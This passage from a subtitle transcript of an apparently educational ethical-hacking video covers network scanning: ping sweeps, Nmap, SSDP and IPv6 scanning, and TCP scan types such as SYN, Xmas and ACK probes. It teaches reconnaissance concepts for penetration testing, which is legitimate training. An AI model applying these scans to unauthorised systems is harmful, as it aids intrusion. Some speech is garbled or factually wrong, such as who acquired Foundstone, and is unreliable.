minute.\n\n394\n00:18:13.135 --> 00:18:19.500\nSo, just go ahead and ping,\nwho haven't we talked to today?\n\n395\n00:18:19.500 --> 00:18:21.170\nLet's ping www.nhflorida.com.\n\n396\n00:18:21.170 --> 00:18:28.160\nAll right, so we're just gonna get back\nresponse, we're getting four packets back.\n\n397\n00:18:28.160 --> 00:18:29.730\nPretty straightforward, right?\n\n398\n00:18:29.730 --> 00:18:32.536\nAnd are we're getting more\npackets back if you didn't\n\n399\n00:18:32.536 --> 00:18:33.290\n[INAUDIBLE]\n>> Yeah.\n\n400\n00:18:33.290 --> 00:18:34.360\n>> So that's fine, either way.\n\n401\n00:18:34.360 --> 00:18:36.530\nBut we're getting back an answer,\nessentially saying yes,\n\n402\n00:18:36.530 --> 00:18:38.360\nnhflorida is alive.\n\n403\n00:18:38.360 --> 00:18:45.250\nAnd this is just one version of how we can\ndo checking for live systems and scanning.\n\n404\n00:18:45.250 --> 00:18:48.250\nAn ICMP scan could be nothing\nmore than just a quick ping.\n\n405\n00:18:48.250 --> 00:18:50.750\nNow we can use a tool that\ndoes a lot more than this.\n\n406\n00:18:50.750 --> 00:18:53.090\nThis is just right off\nthe top of our head.\n\n407\n00:18:53.090 --> 00:18:54.240\nWe've got a machine.\n\n408\n00:18:54.240 --> 00:18:56.460\nAll we wanna do is check quickly and\nvalidate that.\n\n409\n00:18:56.460 --> 00:18:57.320\nWe can do that.\n\n410\n00:18:57.320 --> 00:19:00.410\nWe can go, and\nwe can run something Nmap or Zenmap.\n\n411\n00:19:00.410 --> 00:19:04.910\nWe can do a lot more detailed information\ngathering using the same process.\n\n412\n00:19:04.910 --> 00:19:08.770\n>> And that can be very helpful if\nlet's say you've got a Class B network,\n\n413\n00:19:08.770 --> 00:19:11.335\nyou don't wanna scan\nevery single IP address,\n\n414\n00:19:11.335 --> 00:19:14.320\n65,000 ports,\nwhen half of them aren't in use.\n\n415\n00:19:14.320 --> 00:19:17.880\n>> Absolutely, or\neven just a class C in 254.\n\n416\n00:19:17.880 --> 00:19:22.030\nListen, I don't want to do any more\nwork than I absolutely have to.\n\n417\n00:19:22.030 --> 00:19:25.190\nWhen I do this kind of stuff, because\nthere's so many things we've got to do,\n\n418\n00:19:25.190 --> 00:19:29.130\nthe more time it takes, the longer I've\ngotta work and the longer the client has\n\n419\n00:19:29.130 --> 00:19:32.340\nto wait to figure out how vulnerable\nthey are which is not a good thing.\n\n420\n00:19:32.340 --> 00:19:35.610\nSo the reality is we could streamline\nthat process, it's always better,\n\n421\n00:19:35.610 --> 00:19:37.165\nthere's no doubt about it,right?\n\n422\n00:19:37.165 --> 00:19:41.180\nSo if we can take a tool, automate some\nof that and cut down on the amount of\n\n423\n00:19:41.180 --> 00:19:46.035\naddresses simply by doing a quick\nlive check, are you there and\n\n424\n00:19:46.035 --> 00:19:50.365\nwe can narrow that IP range, absolutely,\nMike brings up a very important point.\n\n425\n00:19:50.365 --> 00:19:54.135\nA lot of private IP address ranges behind\nthe firewall today on corporate networks\n\n426\n00:19:54.135 --> 00:19:55.315\nare class A.\n\n427\n00:19:55.315 --> 00:19:58.877\nYou're talking about 16 million address,\nin theory, [LAUGH] right?\n\n428\n00:19:58.877 --> 00:20:00.399\nScanning that can take a lot of time.\n\n429\n00:20:00.399 --> 00:20:01.957\nEven if three quarters of them or\n\n430\n00:20:01.957 --> 00:20:04.837\nalmost all of them are not available,\nthey're dead, they're not responding,\n\n431\n00:20:04.837 --> 00:20:08.497\nyou've still got to hit each one,\nwait for a response and then move on.\n\n432\n00:20:08.497 --> 00:20:12.173\nIf that's two or three seconds per system,\nyou're talking about hours and\n\n433\n00:20:12.173 --> 00:20:13.423\nhours of time, right?\n\n434\n00:20:13.423 --> 00:20:16.443\nSo we really have to be thinking about\nthat and using the tool to narrow that.\n\n435\n00:20:16.443 --> 00:20:18.403\nIt's gonna be helpful and\nwe'll take a look at NMAP.\n\n436\n00:20:18.403 --> 00:20:20.453\nWe'll talk about how that works and\nsee that.\n\n437\n00:20:20.453 --> 00:20:23.983\nWe just want to give you a basic idea\nof the fact that you can use just every\n\n438\n00:20:23.983 --> 00:20:25.853\ncommon tool you have in the system, right?\n\n439\n00:20:25.853 --> 00:20:29.643\nEvery system on the planet regards\nan operating system running on it\n\n440\n00:20:29.643 --> 00:20:33.920\nhas the ability through a command line\nsomehow, someway to do a quick ping.\n\n441\n00:20:33.920 --> 00:20:35.950\nThat's just the way it is,\nright, you can do that.\n\n442\n00:20:35.950 --> 00:20:39.880\nSo there's a million different ping\ntools out there, advanced IP scanner,\n\n443\n00:20:39.880 --> 00:20:42.710\nPing Sweep, Ping Scanner Pro,\nthere's a million of them.\n\n444\n00:20:42.710 --> 00:20:44.340\nWe'll take a look at a few.\n\n445\n00:20:44.340 --> 00:20:45.890\nMost of them are free.\n\n446\n00:20:45.890 --> 00:20:48.490\nI like Angry IP Scanner a lot.\n\n447\n00:20:48.490 --> 00:20:50.570\nMega Ping is another good\none that's out there.\n\n448\n00:20:50.570 --> 00:20:51.470\nThey're all free.\n\n449\n00:20:51.470 --> 00:20:54.700\nYou could just download them and\nuse them and scan anything you want scan,\n\n450\n00:20:55.780 --> 00:20:59.720\nwhat is it, from,\nit used to be Blackstone, no,\n\n451\n00:20:59.720 --> 00:21:03.330\nit used to be, I'm having a stupid moment.\n\n452\n00:21:03.330 --> 00:21:04.770\nSuper scan is what I'm trying to think of.\n\n453\n00:21:04.770 --> 00:21:05.420\n>> Super scan, yeah.\n\n454\n00:21:05.420 --> 00:21:06.440\n>> It's owned now by Wind Turtles.\n\n455\n00:21:06.440 --> 00:21:08.350\n>> Yes.\n>> Windows bought them and but\n\n456\n00:21:08.350 --> 00:21:11.010\nit used to be Blackstone or Foundstone,\n\n457\n00:21:11.010 --> 00:21:13.860\nit used to be Foundstone years ago\n>> You do this long enough\n\n458\n00:21:13.860 --> 00:21:17.064\nyou've got all this crazy stuff\nrunning around in your head.\n\n459\n00:21:17.064 --> 00:21:20.317\n[CROSSTALK] Yeah, used to be and\nit was owned by Foundstone.\n\n460\n00:21:20.317 --> 00:21:24.541\nThey got bought up by Windows when they\nbought the system terminals tool set and\n\n461\n00:21:24.541 --> 00:21:27.470\nthey ultimately went out and\nbought them as well.\n\n462\n00:21:27.470 --> 00:21:30.090\nGreat set of tools, free of charge,\nalmost without exception.\n\n463\n00:21:30.090 --> 00:21:32.190\nPhenomenal little set of tools,\nreally good.\n\n464\n00:21:32.190 --> 00:21:34.450\nWe also could do SSDP scanning.\n\n465\n00:21:34.450 --> 00:21:37.420\nSimple service discovery\nprotocol is what SSDP stands for.\n\n466\n00:21:37.420 --> 00:21:40.170\nYou may or may not come across this one.\n\n467\n00:21:40.170 --> 00:21:42.000\nThis works in conjunction with UPnP,\n\n468\n00:21:42.000 --> 00:21:46.630\nthe Universal Plug and Play protocol to\nbe able to detect plug n play systems and\n\n469\n00:21:46.630 --> 00:21:50.010\nbe able to set them up and to be able to\nunderstand what's going on with them.\n\n470\n00:21:50.010 --> 00:21:53.190\nThere are vulnerabilities\nin UPnP as a protocol.\n\n471\n00:21:53.190 --> 00:21:56.220\nThere are many of them although some\nof them are more important than others.\n\n472\n00:21:56.220 --> 00:21:58.180\nWe may be able to do buffer overflows or\n\n473\n00:21:58.180 --> 00:22:01.490\ndenial service attacks if we\nexploit certain weaknesses there.\n\n474\n00:22:01.490 --> 00:22:06.060\nSo scanning for this protocol to find\nweaknesses is also gonna be important.\n\n475\n00:22:06.060 --> 00:22:11.030\nWe can do this through Kali Linux,\nusing H Ping for instance.\n\n476\n00:22:11.030 --> 00:22:16.320\nWe can go out and we can take a look or we\ncan go out and we can do an end map scan\n\n477\n00:22:16.320 --> 00:22:20.490\nin Kali and we can use end map\nto find this kind of stuff, so\n\n478\n00:22:20.490 --> 00:22:24.090\nscanning for\nSSDP may be of importance to us as well.\n\n479\n00:22:24.090 --> 00:22:25.250\nWhat about scanning for IPV6.\n\n480\n00:22:25.250 --> 00:22:28.750\nWe talk a lot about scanning for IPV4 and\n\n481\n00:22:28.750 --> 00:22:32.570\ntalk a lot about being able to\njust use a generic network scan.\n\n482\n00:22:32.570 --> 00:22:36.040\nWe don't really spend a lot of time\ndifferentiating, but there is more and\n\n483\n00:22:36.040 --> 00:22:40.560\nmore today, the use of IPv4 and\nIPv6 on a lot of networks and\n\n484\n00:22:40.560 --> 00:22:46.160\nas a result of that, we wanna be thinking\nabout the fact that scanning just for\n\n485\n00:22:46.160 --> 00:22:50.810\nIP traffic really has to be subdivided\ninto scanning for both sets now.\n\n486\n00:22:50.810 --> 00:22:53.480\nWe're talking about 128-bit\naddress block versus a 32-bit.\n\n487\n00:22:53.480 --> 00:22:56.450\nWe're talking about\nbeing able to go out and\n\n488\n00:22:56.450 --> 00:23:00.520\ndo a traditional network scan which is\ncomputationally, probably not feasible\n\n489\n00:23:00.520 --> 00:23:04.620\nin the IPv6 address space because you're\ntalking about such a large space by\n\n490\n00:23:04.620 --> 00:23:08.970\ncomparison because we're searching\n64 bits, right, of host addresses.\n\n491\n00:23:08.970 --> 00:23:12.000\nOr you have to think about the fact\nthat it's two to the 64th power.\n\n492\n00:23:12.000 --> 00:23:15.370\nTwo with 64 zeroes at the end of it for\nthe number of addresses, right?\n\n493\n00:23:15.370 --> 00:23:18.341\nThat's gonna be a really big issue for\nus, 128 bit address.\n\n494\n00:23:18.341 --> 00:23:21.880\nSo we're not gonna be able to use\ntraditional methods to do IPv6 scanning.\n\n495\n00:23:21.880 --> 00:23:24.870\nYou have to have tools\nspecifically designed for this and\n\n496\n00:23:24.870 --> 00:23:28.070\na lot of the older tools may\nnot have IPv6 capabilities.\n\n497\n00:23:28.070 --> 00:23:31.540\nThere are new tools that do, but\nyou have to think about that as well and\n\n498\n00:23:31.540 --> 00:23:34.150\nwe have to be thinking about how\nwe're gonna take advantage of and\n\n499\n00:23:34.150 --> 00:23:37.800\npotentially scan for\ninformation in the IPv6 range.\n\n500\n00:23:37.800 --> 00:23:41.470\nI don't know if any of you are running\nIPv6 on your networks in production.\n\n501\n00:23:41.470 --> 00:23:45.760\nIt is supported natively in almost every\nmodern network operating system today,\n\n502\n00:23:45.760 --> 00:23:46.760\nwhether you enable it and\n\n503\n00:23:46.760 --> 00:23:50.210\nuse it, it's turned on you just\nmay not choose to deploy it.\n\n504\n00:23:50.210 --> 00:23:52.430\nVery heavily used in certain\nareas around the world.\n\n505\n00:23:52.430 --> 00:23:56.240\nVery popular in Europe for instance today,\nnot as much so in the United States, but\n\n506\n00:23:56.240 --> 00:23:57.860\ncertainly becoming more popular.\n\n507\n00:23:57.860 --> 00:24:02.717\nI talk a lot to customers, a lot to\nstudents in classes, and VMware, and\n\n508\n00:24:02.717 --> 00:24:04.959\nthings like that, about IPv6.\n\n509\n00:24:04.959 --> 00:24:08.263\nAnd a lot of them are not really\ndipping their toe in the water yet,\n\n510\n00:24:08.263 --> 00:24:10.320\nbecause they realize that it is a shift.\n\n511\n00:24:10.320 --> 00:24:12.803\nThey do really have to plan for\nit, and they are not prepared.\n\n512\n00:24:12.803 --> 00:24:14.803\nBut then I talk to as I said,\npeople overseas and\n\n513\n00:24:14.803 --> 00:24:16.509\nthey are like why arent you using IPv6.\n\n514\n00:24:16.509 --> 00:24:18.110\n>> How could you not, right?\n\n515\n00:24:18.110 --> 00:24:19.915\nIPv4 that is so yesterday.\n\n516\n00:24:19.915 --> 00:24:21.099\n>> [LAUGH]\n>> You are so\n\n517\n00:24:21.099 --> 00:24:24.310\nyesterday compared to what\nyou would be doing today.\n\n518\n00:24:24.310 --> 00:24:27.617\nSo it really is a questions of where you\nare and if you are one of those security\n\n519\n00:24:27.617 --> 00:24:30.735\nprofessionals that works in our\nindustry that is kind of a freelancer.\n\n520\n00:24:30.735 --> 00:24:34.027\nA hired gun that moves around as\na consultant dealing with different\n\n521\n00:24:34.027 --> 00:24:37.160\ncustomers, you may work in\ndifferent parts of the world.\n\n522\n00:24:37.160 --> 00:24:40.620\nIf you work for one of the big accounting\nor consulting firms, the Deloittes,\n\n523\n00:24:40.620 --> 00:24:44.750\nthe PricewaterhouseCoopers to the world\nas an information consultant, and\n\n524\n00:24:44.750 --> 00:24:46.690\nget deployed into different areas.\n\n525\n00:24:46.690 --> 00:24:49.430\nYou may very well come across both of\nthese, depending on where you work.\n\n526\n00:24:49.430 --> 00:24:52.400\nAnd you got to think about the fact\nyou have to be comfortable with that.\n\n527\n00:24:52.400 --> 00:24:55.386\nUsing the variety of tools helps you\nto understand how to do that and\n\n528\n00:24:55.386 --> 00:24:56.729\nto become more comfortable.\n\n529\n00:24:56.729 --> 00:25:00.779\nBut you have to start thinking out beyond\nthe borders of your little secure enclave\n\n530\n00:25:00.779 --> 00:25:03.140\nwhere you work and\nwhere you're comfortable.\n\n531\n00:25:03.140 --> 00:25:07.063\nYou gotta go out and really think about\nwhat kind of tools am I gonna see out\n\n532\n00:25:07.063 --> 00:25:09.980\nthere, how am I gonna use them,\nor what am I gonna do?\n\n533\n00:25:09.980 --> 00:25:12.750\nThat would be something to consider,\nso just think about that.\n\n534\n00:25:13.960 --> 00:25:16.937\nThoughts about scanning and\nthings that we're talking about?\n\n535\n00:25:16.937 --> 00:25:20.659\n>> You touched on IPV6, I know one of the\nthings that I deal with a lot of the times\n\n536\n00:25:20.659 --> 00:25:22.951\nwhen we're talking about\nMicrosoft stuff is,\n\n537\n00:25:22.951 --> 00:25:25.492\npeople aren't even aware\nthat I think since Vista.\n\n538\n00:25:25.492 --> 00:25:31.600\nThey are using IPV6 in the background\nwhether you're planning on it or not.\n\n539\n00:25:31.600 --> 00:25:33.304\nThey're configuring that [CROSSTALK]\nunique local address, yeah.\n\n540\n00:25:33.304 --> 00:25:35.840\nSo they automatically have\na linked local address.\n\n541\n00:25:35.840 --> 00:25:40.870\nIf there's any kind of advertisements,\nyour ISP sometimes is advertising a prefix\n\n542\n00:25:40.870 --> 00:25:44.010\nfor you and you might not know it,\nyour router picks that up, advertises it.\n\n543\n00:25:44.010 --> 00:25:46.802\nThey might even get a globally\nroutable unique address.\n\n544\n00:25:46.802 --> 00:25:49.800\nSo it is something that we\ndefinitely have to consider.\n\n545\n00:25:49.800 --> 00:25:50.892\n>> Yeah, and it is there and\n\n546\n00:25:50.892 --> 00:25:53.703\nas I've talked about before it's\nsomething that as Mike said,\n\n547\n00:25:53.703 --> 00:25:57.001\nyou may not realize that it's running and\nyou may not realize it's there.\n\n548\n00:25:57.001 --> 00:25:59.718\nBut if you do an IP config on\na Windows system as he said,\n\n549\n00:25:59.718 --> 00:26:03.440\nrunning from Vista forward, gone are\nthe days where you had to enable it and\n\n550\n00:26:03.440 --> 00:26:06.610\ninstall it in the stack in 2000,\nturn it on whatever.\n\n551\n00:26:06.610 --> 00:26:07.920\nYeah, you'll see you get back and\n\n552\n00:26:07.920 --> 00:26:11.000\nIPv6 address as well as\nan IPv4 address automatically.\n\n553\n00:26:11.000 --> 00:26:12.790\nSo you wanna just think about that,\nwe'll demo that and\n\n554\n00:26:12.790 --> 00:26:15.770\nshow that you in the lab environment when\nwe go in one of our future episodes and\n\n555\n00:26:15.770 --> 00:26:17.208\nstart playing around with some tools.\n\n556\n00:26:17.208 --> 00:26:20.170\nBut we wanna be thinking about\nthe different scans we can engage in,\n\n557\n00:26:20.170 --> 00:26:22.480\nthe different ways we can\nuse this information,\n\n558\n00:26:22.480 --> 00:26:25.460\nthe different kinds of\ninformation that will come back.\n\n559\n00:26:25.460 --> 00:26:28.281\nSo can you do me a favor can you\njust go on Google real quick, and\n\n560\n00:26:28.281 --> 00:26:31.608\ntell us when your ready, we'll come\nup on the screen as soon as your set.\n\n561\n00:26:31.608 --> 00:26:36.042\nIn Google, do a search for\nTCP scan results and\n\n562\n00:26:36.042 --> 00:26:41.950\ndo the search, and\nwe'll bring it up as soon as your ready.\n\n563\n00:26:41.950 --> 00:26:43.194\nLet's just go to Mike's machine for\na second.\n\n564\n00:26:43.194 --> 00:26:46.287\nSo if you can zoom in just so we can\nsee what you'll get there generically.\n\n565\n00:26:46.287 --> 00:26:50.212\nAnd so when you do this, you'll see that\none of the first things you'll find is\n\n566\n00:26:50.212 --> 00:26:52.782\ndiscussions about things\nlike TCP Port Scanning.\n\n567\n00:26:52.782 --> 00:26:55.398\nJust a variety of different\ntools that can be used.\n\n568\n00:26:55.398 --> 00:26:59.400\nA lot of it focuses on Nmap as\nyou can see, and how to use Nmap.\n\n569\n00:26:59.400 --> 00:27:00.241\nWe're gonna go in and take a look at that.\n\n570\n00:27:00.241 --> 00:27:04.322\nNmap is not the only tool even though it's\nprobably one of the most popular ones, and\n\n571\n00:27:04.322 --> 00:27:07.360\nclearly you can see a lot of\npeople are talking about it.\n\n572\n00:27:07.360 --> 00:27:13.318\nGo up and search now for, instead of\nTCP scan results, do TCP scan types.\n\n573\n00:27:13.318 --> 00:27:16.317\nAnd what I just want you to see\nis if you need to go out and\n\n574\n00:27:16.317 --> 00:27:20.209\nread up on the scan types a little bit and\nunderstand more about them.\n\n575\n00:27:20.209 --> 00:27:23.786\nYou'll see that with port scanning\ntechniques, one of the first ones that\n\n576\n00:27:23.786 --> 00:27:26.737\ncomes up, with Nmap and\nthe Nmap tutorial's right below it,\n\n577\n00:27:26.737 --> 00:27:29.612\nyou'll be able to find some\nreal good information on that.\n\n578\n00:27:29.612 --> 00:27:33.920\nClick on the very first link, the Nmap\nport scanning techniques from Nmap.\n\n579\n00:27:33.920 --> 00:27:37.115\nYou'll be able to go to the Nmap website,\nand what you'll find there is you'll find\n\n580\n00:27:37.115 --> 00:27:39.190\na discussion on different\nport scanning techniques.\n\n581\n00:27:39.190 --> 00:27:42.133\nAnd discussions about things\nlike a full open scanner,\n\n582\n00:27:42.133 --> 00:27:44.020\nwhat's called a TCP connect scan.\n\n583\n00:27:44.020 --> 00:27:45.966\nYou'll see the SYN scan is there,\n\n584\n00:27:45.966 --> 00:27:49.680\nI think the next one is the Connect\nscan I was just mentioning.\n\n585\n00:27:49.680 --> 00:27:53.039\nYou've got a UDP scan there,\nso you'll see different scans.\n\n586\n00:27:53.039 --> 00:27:54.823\nWhat is that?\n\n587\n00:27:54.823 --> 00:28:00.260\nThe SCTP, Nscan, you've got all sorts of\ndifferent ones there, FEN, Xmas, null.\n\n588\n00:28:00.260 --> 00:28:02.434\nOnce I mention all of\nthe different scans are there.\n\n589\n00:28:02.434 --> 00:28:05.922\nSo if you need a little primer\non how to do the scan or\n\n590\n00:28:05.922 --> 00:28:08.800\nhow to go ahead and how to read up on it.\n\n591\n00:28:08.800 --> 00:28:10.685\nMake sure you're comfortable\nwith it as I said,\n\n592\n00:28:10.685 --> 00:28:13.390\nwanna make sure we're\ncomfortable with each scan type.\n\n593\n00:28:13.390 --> 00:28:15.310\nBe good for\nyou to go out doing a research,\n\n594\n00:28:15.310 --> 00:28:16.950\nmake sure you are familiar with them.\n\n595\n00:28:16.950 --> 00:28:20.585\nThe full open scans, we talked about\nwhat's common called TCP connect is gonna\n\n596\n00:28:20.585 --> 00:28:24.014\nallow you to go out and create\na connection doing a three-way handshakes.\n\n597\n00:28:24.014 --> 00:28:28.620\nSo we're gonna do the SYN ACKcombination\nto be able to establish connectivity.\n\n598\n00:28:28.620 --> 00:28:30.650\nSYN, SYN-ACK, ACK,\nthe three-way handshake,\n\n599\n00:28:30.650 --> 00:28:32.044\nand we're gonna then look at that.\n\n600\n00:28:32.044 --> 00:28:37.040\nAnd then we're gonna reset that and\nsend a reset packet, an RCT packet.\n\n601\n00:28:37.040 --> 00:28:39.605\nAnd as a result we're gonna see what\nthe response is, how the machine behaves.\n\n602\n00:28:39.605 --> 00:28:44.010\nWhether it accepts inbound connections,\nhow it sets up, what it's gonna do,\n\n603\n00:28:44.010 --> 00:28:46.100\nwe're gonna record all that.\n\n604\n00:28:46.100 --> 00:28:49.220\nWe could be doing a stealth scan,\nwhat's called a half open scan.\n\n605\n00:28:49.220 --> 00:28:51.930\nA stealth scan, I'm sure it's on\nthere somewhere if you take a look.\n\n606\n00:28:51.930 --> 00:28:55.773\nThe stealth scan is gonna allow us to\nset up and essentially go through and\n\n607\n00:28:55.773 --> 00:28:59.183\nsend out a single Syn-Pac and\nit may be down towards the bottom.\n\n608\n00:28:59.183 --> 00:29:01.460\nSo send out an single syn packet.\n\n609\n00:29:01.460 --> 00:29:04.170\nIf the port on the far\nside receiver is open,\n\n610\n00:29:04.170 --> 00:29:07.750\nthere were gonna get back as SYN-ACK if\nit's not obviously we don't get anything.\n\n611\n00:29:07.750 --> 00:29:12.280\nAnd then if we response with the reset,\nthat reset then is gonna tell us that\n\n612\n00:29:12.280 --> 00:29:14.280\nwe're not open that\nconnection is not available.\n\n613\n00:29:14.280 --> 00:29:16.756\nBut if we get back to SYN-ACK,\nwe know that that connection's open and\n\n614\n00:29:16.756 --> 00:29:18.424\nessentially we can\nestablish communication.\n\n615\n00:29:18.424 --> 00:29:22.818\nSo we wanna be able to figure out what\nstatus the machine is in that we're\n\n616\n00:29:22.818 --> 00:29:26.290\ntrying to connect with or\nprobe on the other side.\n\n617\n00:29:26.290 --> 00:29:28.269\nSo again, we wanna look at\nthese different scan types.\n\n618\n00:29:28.269 --> 00:29:31.555\nThey could be attack types cause we\nexecute attacks through these scans, but\n\n619\n00:29:31.555 --> 00:29:32.423\nwe call them scans.\n\n620\n00:29:32.423 --> 00:29:36.378\nBecause we wanna understand more\nabout the status of the system and\n\n621\n00:29:36.378 --> 00:29:38.080\nprobing helps us to do this.\n\n622\n00:29:38.080 --> 00:29:41.930\nSo we talked about the TCP connect or the\nfull open, talked about the stealth scan,\n\n623\n00:29:41.930 --> 00:29:43.580\nthe half open scan.\n\n624\n00:29:43.580 --> 00:29:45.980\nWe also have the inverse TCP\n\n625\n00:29:45.980 --> 00:29:50.670\nflag scan where we can send pro packets\nwith a TCP flag as we've talked about.\n\n626\n00:29:50.670 --> 00:29:56.301\nThin urge, so thin-ish, urgent push, etc,\nor no flags and see what happens there.\n\n627\n00:29:56.301 --> 00:29:57.062\nIs the port open?\n\n628\n00:29:57.062 --> 00:29:58.088\nWe know something about it.\n\n629\n00:29:58.088 --> 00:29:59.431\nIs the port closed?\n\n630\n00:29:59.431 --> 00:30:01.835\nIf the port is open,\nwe don't get a response.\n\n631\n00:30:01.835 --> 00:30:04.115\nSo we know in other words,\nthat there's something there.\n\n632\n00:30:04.115 --> 00:30:08.465\nThe port is closed, we get a reset packet\nwhich essentially says hey, nothing there.\n\n633\n00:30:08.465 --> 00:30:09.644\nThat tells us something as well,\n\n634\n00:30:09.644 --> 00:30:11.505\nbecause that means that\nthat port is not available.\n\n635\n00:30:11.505 --> 00:30:15.321\nSo if we're scanning a machine looking for\n\n636\n00:30:15.321 --> 00:30:19.456\nport I don't know,\npick your favorite port.\n\n637\n00:30:19.456 --> 00:30:20.263\n125, awesome.\n\n638\n00:30:20.263 --> 00:30:20.889\nThank you very much.\n\n639\n00:30:20.889 --> 00:30:23.187\n>> [LAUGH]\n>> This is what happens when we do live TV\n\n640\n00:30:23.187 --> 00:30:24.612\nwith no safety net folks.\n\n641\n00:30:24.612 --> 00:30:27.395\nSo when we do port 25 or for\nscanning and the port is closed,\n\n642\n00:30:27.395 --> 00:30:28.881\nwe're gonna get back to reset.\n\n643\n00:30:28.881 --> 00:30:32.111\nIf the scan is there and\nit's available and the ports opened,\n\n644\n00:30:32.111 --> 00:30:33.921\nwe're gonna knock at a response.\n\n645\n00:30:33.921 --> 00:30:36.031\nWe're making a response so\nsomething like that.\n\n646\n00:30:36.031 --> 00:30:39.246\nA prompt to log in if it's an email system\nwhatever, but we'll get back a reset,\n\n647\n00:30:39.246 --> 00:30:40.397\nif there's nothing there.\n\n648\n00:30:40.397 --> 00:30:44.250\nEssentially saying that port closed,\nthe service is not available.\n\n649\n00:30:44.250 --> 00:30:47.440\nThat's gonna allow us to understand\nthat the port is not there and\n\n650\n00:30:47.440 --> 00:30:48.720\nwe can move on in our list.\n\n651\n00:30:48.720 --> 00:30:51.654\nAnd scan through a list of 3,000 ports,\nand\n\n652\n00:30:51.654 --> 00:30:55.220\nget back 5 responses,\nprofile the 5 open ports.\n\n653\n00:30:55.220 --> 00:30:57.511\nXmas scan where we turn on all\nthe flags we talked about.\n\n654\n00:30:57.511 --> 00:31:00.226\nAnd know exactly what\nwe're gonna get back or\n\n655\n00:31:00.226 --> 00:31:03.270\nnot get back based on all\nthose flags being on.\n\n656\n00:31:03.270 --> 00:31:07.260\nRemember, we're gonna basically light up\nthe scan like a christmas tree turning on\n\n657\n00:31:07.260 --> 00:31:08.140\nthose flags.\n\n658\n00:31:08.140 --> 00:31:11.260\nIf the port is closed, remember we\nget a reset, if the port is open,\n\n659\n00:31:11.260 --> 00:31:13.830\nwe don't get a response,\nthat's what we're looking for.\n\n660\n00:31:13.830 --> 00:31:16.080\nAnd again, I wanna stress and\ndifferentiate for you.\n\n661\n00:31:16.080 --> 00:31:17.440\nPort open, no response.\n\n662\n00:31:17.440 --> 00:31:19.170\nPort closed, reset packet.\n\n663\n00:31:19.170 --> 00:31:23.590\nThat tells us whether that port is in\nplay or whether that port is shut off and\n\n664\n00:31:23.590 --> 00:31:24.970\nwe have to move to another one.\n\n665\n00:31:24.970 --> 00:31:26.450\nWe wanna understand that.\n\n666\n00:31:26.450 --> 00:31:29.980\nWe can do things like act flag\nprobe scanning, where we're sending\n\n667\n00:31:29.980 --> 00:31:33.970\nessentially TCP probe packets with\nthe app or acknowledgement flag on.\n\n668\n00:31:33.970 --> 00:31:37.820\nAgain, looking at individual ones, there's\nall these different ones listed there.\n\n669\n00:31:37.820 --> 00:31:41.832\nWhere we can go and we an look to see\nwhether or not we get a response, and\n\n670\n00:31:41.832 --> 00:31:44.216\nif so\nwhat kind of response do we get back?\n\n671\n00:31:44.216 --> 00:31:45.788\nIs it a Windows system?\n\n672\n00:31:45.788 --> 00:31:48.094\nIf so,\nwhat kind of system are we looking at?\n\n673\n00:31:48.094 --> 00:31:52.273\nIf it's a Windows system, and the reset\npacket comes back with a certain value,\n\n674\n00:31:52.273 --> 00:31:55.115\nwe can tell that it's a certain\nkind of Window system.\n\n675\n00:31:55.115 --> 00:31:56.814\nIf it's not, it'll have a different value.\n\n676\n00:31:56.814 --> 00:31:58.569\nSo there's a lot of subtly, but\n\n677\n00:31:58.569 --> 00:32:02.860\na lot of importance here that we can\ndraw from these different scan types.\n\n678\n00:32:02.860 --> 00:32:07.270\nAnd again, it's a matter of practicing\nthis, understanding and going through it.\n\n679\n00:32:07.270 --> 00:32:09.998\nThere is all these different scan types\nthat we can read up on, we should be\n\n680\n00:32:09.998 --> 00:32:12.912\nfamiliar with and that you wanna become\na little bit more knowledgable about.\n\n681\n00:32:12.912 --> 00:32:16.992\nUsing a tool like Nmap or\nZenmap the Windows port of it will give\n\n682\n00:32:16.992 --> 00:32:20.061\nyou a easy interface to\nfigure this stuff out.\n\n683\n00:32:20.061 --> 00:32:23.920\nYou can chose from a menu if it's\nthe Windows graphical vision of the tool\n\n684\n00:32:23.920 --> 00:32:25.065\nthe version Zenmap.\n\n685\n00:32:25.065 --> 00:32:28.067\nAnd you could say, well I want this\nkind of scan and we have scan profiles.\n\n686\n00:32:28.067 --> 00:32:31.027\nAnd I'll actually even show you how\nto create your own scan profile and\n\n687\n00:32:31.027 --> 00:32:32.250\nset it up and save it.\n\n688\n00:32:32.250 --> 00:32:33.734\nSo we'll take a look at that\nin an upcoming episode.\n\n689\n00:32:33.734 --> 00:32:38.420\nIn Linux and Kali Linux whatever\nversion of Linux you use the tool in.\n\n690\n00:32:38.420 --> 00:32:41.090\nYou may have a command line interface, you\nmay have a graphical interface depends on\n\n691\n00:32:41.090 --> 00:32:44.850\nthe version and the build, either way\nyou're gonna have a chance to do this.\n\n692\n00:32:44.850 --> 00:32:47.630\nYou have to know what the scans\nare though to take advantage of it.\n\n693\n00:32:47.630 --> 00:32:51.610\nAnd so as we think about getting in to\nthis conversation about network scanning.\n\n694\n00:32:51.610 --> 00:32:55.690\nThere's a lot of detail, a lot of\ndifferent scan types, lot of tools,\n\n695\n00:32:55.690 --> 00:32:57.930\nlot of things that we have to be aware of.\n\n696\n00:32:57.930 --> 00:32:58.856\nIn one of our upcoming episodes,\n\n697\n00:32:58.856 --> 00:33:00.287\nwe're gonna take you through\nsome of these tools.\n\n698\n00:33:00.287 --> 00:33:04.240\nWe're gonna show you how to use them,\nexamine a little bit in more detail.\n\n699\n00:33:04.240 --> 00:33:05.910\nWhat some of the choices\nare we wanna make and\n\n700\n00:33:05.910 --> 00:33:08.920\nas a result what some of the information\nthat we get back will be.\n\n701\n00:33:08.920 --> 00:33:11.440\nAnd we'll make sure that you feel\ncomfortable at least with the subset of\n\n702\n00:33:11.440 --> 00:33:14.180\ntools we're gonna demo for you,\nshowing you what goes on there.\n\n703\n00:33:14.180 --> 00:33:17.745\nRemember, you can broaden that\nconversation out to an entire universe of\n\n704\n00:33:17.745 --> 00:33:20.732\ntools, out beyond the three or\nfour we may choose to show you,\n\n705\n00:33:20.732 --> 00:33:23.452\nbecause of just the fact that\nwe can't demo every tool.\n\n706\n00:33:23.452 --> 00:33:25.376\n>> [LAUGH]\n>> If we did we'd be here doing 40 hours\n\n707\n00:33:25.376 --> 00:33:26.912\nof nothing, but network scanning tools.\n\n708\n00:33:26.912 --> 00:33:29.141\nThat may be cool and\nmay be exciting, but the reality is,\n\n709\n00:33:29.141 --> 00:33:31.590\neven then we probably\nwouldn't get everything.\n\n710\n00:33:31.590 --> 00:33:35.150\nSo you've gotta understand as Mike made\nclear in some of our prior episodes that\n\n711\n00:33:35.150 --> 00:33:38.490\nyou make choices, and you have to decide\nwhat tools are most important for 